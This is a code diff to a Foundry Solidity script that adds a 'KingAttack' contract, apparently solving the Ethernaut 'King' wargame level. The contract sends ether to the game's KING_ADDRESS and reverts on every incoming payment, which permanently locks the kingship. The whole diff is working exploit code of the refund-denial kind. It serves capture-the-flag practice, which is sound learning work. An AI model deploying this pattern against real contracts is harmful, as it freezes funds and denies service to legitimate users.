@@ -7,6 +7,22 @@ import {Script} from "forge-std/Script.sol";
 import {Constants} from "./Constants.s.sol";
 
 
+contract KingAttack is Constants {
+    uint256 private immutable i_prize;
+
+    constructor() public payable {
+        i_prize = msg.value;
+    }
+    
+    function attack() public {
+        KING_ADDRESS.call{value: i_prize}("");
+    }
+
+    receive() external payable {
+        revert("I am THE KING!");
+    }
+}
+
 contract KingAttacker is Constants, Script {
     uint256 private constant STARTING_PRIZE = 1000000000000000;  // 1e15
 
@@ -17,10 +33,7 @@ contract KingAttacker is Constants, Script {
     }
     
     function attack() private {
-        KING_ADDRESS.call{value: STARTING_PRIZE}("");
-    }
-    
-    receive() external payable {
-        revert("I am THE KING!");
+        KingAttack _attack = new KingAttack{value: STARTING_PRIZE}();
+        _attack.attack();
     }
 }
